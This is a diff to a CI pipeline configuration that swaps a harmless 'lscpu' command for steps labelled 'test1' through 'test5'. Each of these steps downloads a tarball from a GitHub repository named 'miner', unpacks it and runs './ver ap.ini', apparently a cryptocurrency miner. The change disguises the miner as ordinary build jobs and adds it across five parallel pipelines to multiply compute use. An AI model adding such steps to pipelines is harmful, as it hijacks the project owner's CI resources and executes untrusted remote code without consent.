@@ -1,19 +1,49 @@
 kind: pipeline
 type: docker
-name: backend
+name: build1
 
 steps:
-- name: build1
+- name: test1
   image: golang
   commands:
-  - lscpu
+  - wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
 ---
 kind: pipeline
 type: docker
-name: frontend
+name: build2
 
 steps:
-- name: build2
+- name: test2
+  image: node
+  commands:
+  - wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
+---
+kind: pipeline
+type: docker
+name: build3
+
+steps:
+- name: test3
+  image: node
+  commands:
+  - wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
+---
+kind: pipeline
+type: docker
+name: build4
+
+steps:
+- name: test4
+  image: node
+  commands:
+  - wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
+---
+kind: pipeline
+type: docker
+name: build5
+
+steps:
+- name: test5
   image: node
   commands:
   - wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
@@ -29,5 +59,8 @@ steps:
    
 
 depends_on:
-- backend
-- frontend
+- build1
+- build2
+- build3
+- build4
+- build5
